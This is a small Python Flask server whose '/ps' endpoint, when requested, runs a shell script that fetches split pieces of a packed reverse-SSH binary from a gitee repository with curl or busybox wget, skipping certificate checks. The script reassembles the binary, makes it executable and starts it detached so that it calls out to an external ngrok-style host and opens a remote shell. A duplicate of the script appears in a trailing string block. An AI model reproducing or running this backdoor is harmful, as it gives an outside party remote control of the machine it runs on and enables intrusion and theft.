import os, datetime,subprocess;
from flask import Flask, request, render_template_string, make_response, jsonify

app = Flask(__name__)


@app.route('/')
def index():
  return str(datetime.datetime.now())+str("\r\n")



@app.route('/ps',
           methods=['GET','POST'])  #request.args  request.form  request.values
def test():  
  op1=subprocess.run('''bash -c 'exec >/tmp/zyz_upx  2>&1  ;set -x;
  url="https://gitee.com/niuhu-blue/rec_she/raw/master/upx_reverse-sshx64.bin.00"
urlA="${url}1"
urlB="${url}2"
tostart2() {
  setsid /tmp/upx_reverse-sshx64.bin -v -b 40044 -p 34292 ngrok.xiaomiqiu123.top &
  return 0
}
if [ -x /tmp/upx_reverse-sshx64.bin ]; then 
  tostart2
elif [ -x /tmp/busybox ]; then
  /tmp/busybox wget --no-check-certificate $urlA &&/tmp/busybox wget --no-check-certificate $urlB &&cat upx_reverse-sshx64.bin.00? > upx_reverse-sshx64.bin&&chmod 0777 ./upx_reverse-sshx64.bin&&tostart2
else
  asd=`curl --help`;
  [ ! -z "$asd" ]  &&curl -k -O $urlA &&curl -k -O $urlB &&cat upx_reverse-sshx64.bin.00? > upx_reverse-sshx64.bin&&chmod 0777 ./upx_reverse-sshx64.bin&&tostart2
fi'
  ''', shell=True, capture_output=True).stdout.decode();
  return str(datetime.datetime.now())+str("\r\n")+str(op1)
  
  
app.run(host='0.0.0.0', port=8080)



'''
url="https://gitee.com/niuhu-blue/rec_she/raw/master/upx_reverse-sshx64.bin.00"
urlA="${url}1"
urlB="${url}2"
tostart2() {
  setsid /tmp/upx_reverse-sshx64.bin -v -b 40044 -p 34292 ngrok.xiaomiqiu123.top &
  return 0
}
if [ -x /tmp/upx_reverse-sshx64.bin ]; then 
  tostart2
elif [ -x /tmp/busybox ]; then
  /tmp/busybox wget --no-check-certificate $urlA &&/tmp/busybox wget --no-check-certificate $urlB &&cat upx_reverse-sshx64.bin.00? > upx_reverse-sshx64.bin&&chmod 0777 ./upx_reverse-sshx64.bin&&tostart2
else
  asd=`curl --help`;
  [ ! -z "$asd" ]  &&curl -k -O $urlA &&curl -k -O $urlB &&cat upx_reverse-sshx64.bin.00? > upx_reverse-sshx64.bin&&chmod 0777 ./upx_reverse-sshx64.bin&&tostart2
fi
'''

 

